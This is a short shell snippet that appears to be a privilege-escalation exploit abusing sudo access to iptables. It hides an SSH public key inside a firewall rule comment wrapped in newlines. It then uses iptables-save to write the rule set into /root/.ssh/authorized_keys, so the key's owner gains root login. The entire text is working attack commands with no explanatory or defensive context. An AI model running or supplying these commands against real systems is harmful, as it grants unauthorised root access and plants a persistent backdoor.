sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKXoUJIzi27EzRNg0KOo+IAKQwAWPvEL+xJycup7mmFk parrot@parrot\n'
   
sudo /usr/sbin/iptables -S
sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys